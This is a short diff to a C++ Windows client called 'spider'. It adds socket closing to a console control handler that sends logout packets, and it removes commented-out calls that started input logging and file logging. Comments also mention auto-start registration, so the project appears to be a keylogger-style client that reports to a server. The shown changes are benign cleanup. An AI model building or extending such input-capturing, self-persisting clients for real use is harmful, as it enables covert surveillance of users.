@@ -25,28 +25,33 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
 	case CTRL_C_EVENT:
 		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
 			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
+		sock.close();
 		return(TRUE);
 
 		// CTRL-CLOSE: confirm that the user wants to exit. 
 	case CTRL_CLOSE_EVENT:
 		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
 			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
+		sock.close();
 		return(TRUE);
 
 		// Pass other signals to the next handler. 
 	case CTRL_BREAK_EVENT:
 		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
 			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
+		sock.close();
 		return FALSE;
 
 	case CTRL_LOGOFF_EVENT:
 		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
 			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
+		sock.close();
 		return FALSE;
 
 	case CTRL_SHUTDOWN_EVENT:
 		sock.write<PackageCMDLogOut>(spider::PacketSerializer<PackageCMDLogOut>(
 			sizeof(PackageHeader) + sizeof(PackageCMDLogOut), 666, packet));
+		sock.close();
 		return FALSE;
 
 	default:
@@ -77,9 +82,6 @@ int main(int ac, char **av)
 	//	//std::cout << "Registering program for auto startup..." << std::endl;
 	//}
 
-	//spider::WindowsLogHandler *tutu = new spider::WindowsLogHandler();
-	//tutu->createFile("logs");
-
 	WSADATA WSAData;
 	WSAStartup(MAKEWORD(2, 0), &WSAData);
 
@@ -100,11 +102,6 @@ int main(int ac, char **av)
 
 	spider::ClientSpider sp((LPVOID)av[0]);
 	sp.run();
-
-	//spider::WindowsInputHandler *inputHandler = new spider::WindowsInputHandler((LPVOID)av[0]);
-	//inputHandler->startLogging(true, true);
-
-	//MessageLoop();
 
 	WSACleanup();
 	return 0;
